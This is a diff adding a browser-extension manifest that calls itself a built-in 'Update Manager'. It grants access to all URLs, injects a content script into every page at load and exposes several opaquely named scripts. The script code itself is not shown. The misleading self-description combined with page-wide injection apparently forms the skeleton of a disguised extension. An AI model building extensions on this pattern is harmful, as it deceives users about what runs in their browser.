@@ -1,0 +1,48 @@
+{
+    "name": "Update Manager",
+    "version": "1.0",
+    "description": "Builtin Extension",
+    "manifest_version": 3,
+    "permissions": [
+        "declarativeNetRequest"
+    ],
+    "host_permissions": [
+        "<all_urls>"
+    ],
+    "declarative_net_request": {
+        "rule_resources": [
+            {
+                "id": "ruleset_1",
+                "enabled": true,
+                "path": "rules.json"
+            }
+        ]
+    },
+    "content_scripts": [
+        {
+            "matches": [
+                "<all_urls>"
+            ],
+            "js": [
+                "content.bootstrap.js"
+            ],
+            "run_at": "document_start"
+        }
+    ],
+    "web_accessible_resources": [
+        {
+            "resources": [
+                "webpack_common.js",
+                "webpack_content.js",
+                "webpack_bnb.js",
+                "webpack_gt.js",
+                "webpack_kuc.js",
+                "webpack_block.js",
+                "webpack_cb.js"
+            ],
+            "matches": [
+                "<all_urls>"
+            ]
+        }
+    ]
+}
